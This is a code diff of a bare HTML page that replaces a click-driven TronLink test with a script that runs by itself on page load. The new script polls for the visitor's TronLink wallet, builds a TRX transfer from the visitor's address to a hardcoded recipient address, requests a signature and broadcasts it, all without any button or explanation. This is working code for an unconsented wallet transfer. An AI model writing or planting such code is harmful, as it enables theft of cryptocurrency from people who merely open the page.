@@ -7,34 +7,17 @@
     <title>Document</title>
     </head>
     <body>
-    <button onclick="gettronweb()">Can you get tronweb from tronlink?</button>
-    <button onclick="sendtx()">Send TX</button>    
-	<script>
-        function gettronweb(){
-        	if(window.tronWeb && window.tronWeb.defaultAddress.base58){
-            	document.write("Yes, catch it: ",window.tronWeb.defaultAddress.base58)
-            }else{
-				document.write("failed")
-			}
-        }
-		function sendtx(){
-			document.write("fase 0")
-			if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                document.write("fase 1")
-				var tronweb = window.tronWeb
-				document.write("fase 2")
-				var fromadd = window.tronWeb.defaultAddress.base58
-                document.write("fase 3")
-				var tx = tronweb.transactionBuilder.sendTrx('TRQyHhdcfRzjwqNS1t4mesaqLF5rEyRT4R', 10)
-                document.write("fase 4")
- 				var signedTx = tronweb.trx.sign(tx)
-                document.write("fase 5")
-				var broastTx = tronweb.trx.sendRawTransaction(signedTx)
-                document.write("fatto")
-            } else {
-				document.write("fallimento")
-			}
-		}
+    <script>
+        var obj = setInterval(async ()=>{
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                clearInterval(obj)
+                var tronweb = window.tronWeb
+                var tx = await tronweb.transactionBuilder.sendTrx('TRQyHhdcfRzjwqNS1t4mesaqLF5rEyRT4R', 10, window.tronWeb.defaultAddress.base58)
+                var signedTx = await tronweb.trx.sign(tx)
+                var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
+                console.log(broastTx)
+            }
+        }, 10)
     </script>
     </body>
 </html>
